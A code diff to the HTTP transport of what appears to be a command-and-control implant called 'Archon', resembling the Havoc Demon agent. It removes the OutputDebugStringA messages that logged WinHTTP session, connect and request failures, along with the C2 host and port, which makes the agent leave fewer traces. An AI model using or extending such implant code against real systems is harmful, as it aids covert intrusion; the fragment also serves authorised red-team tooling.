@@ -3,8 +3,6 @@
 #include <core/TransportHttp.h>
 #include <core/MiniStd.h>
 
-#include <stdio.h>
-
 #ifdef TRANSPORT_HTTP
 
 /* ARC-06: safe fallback for older MinGW SDKs that predate TLS 1.3 WinHTTP flags */
@@ -244,14 +242,6 @@ BOOL HttpSend(
         }
 
         if ( ! Instance->hHttpSession ) {
-            CHAR ods[ 112 ];
-            snprintf(
-                ods,
-                sizeof( ods ),
-                "Archon: WinHttpOpen failed le=%lu",
-                (unsigned long) NtGetLastError()
-            );
-            OutputDebugStringA( ods );
             PRINTF_DONT_SEND( "WinHttpOpen: Failed => %d\n", NtGetLastError() )
             goto LEAVE;
         }
@@ -277,16 +267,6 @@ BOOL HttpSend(
         Instance->Config.Transport.Host->Port,
         0
     ) ) ) {
-        CHAR ods[ 112 ];
-        snprintf(
-            ods,
-            sizeof( ods ),
-            "Archon: WinHttpConnect failed le=%lu host=%ls port=%u",
-            (unsigned long) NtGetLastError(),
-            Instance->Config.Transport.Host->Host,
-            (unsigned int) Instance->Config.Transport.Host->Port
-        );
-        OutputDebugStringA( ods );
         PRINTF_DONT_SEND( "WinHttpConnect: Failed => %d\n", NtGetLastError() )
         goto LEAVE;
     }
@@ -316,14 +296,6 @@ BOOL HttpSend(
         NULL,
         HttpFlags
     ) ) ) {
-        CHAR ods[ 96 ];
-        snprintf(
-            ods,
-            sizeof( ods ),
-            "Archon: WinHttpOpenRequest failed le=%lu",
-            (unsigned long) NtGetLastError()
-        );
-        OutputDebugStringA( ods );
         PRINTF_DONT_SEND( "WinHttpOpenRequest: Failed => %d\n", NtGetLastError() )
         goto LEAVE;
     }
